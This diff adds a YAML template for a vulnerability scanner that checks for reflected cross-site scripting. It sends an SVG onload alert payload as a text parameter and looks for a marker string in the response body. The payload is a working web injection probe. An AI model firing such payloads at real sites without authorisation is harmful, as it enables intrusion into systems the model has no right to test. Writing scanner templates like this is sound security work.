@@ -1,0 +1,20 @@
+id: xss4-368
+name: 'Raw XSS4 #7 in text'
+severity: high
+type: active
+tags:
+  - xss
+  - injection
+  - client
+description: 'Unencoded reflection in text'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      text:
+        - '<svg%0A%0Aonload=alert(nx4367)>'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'nx4367'
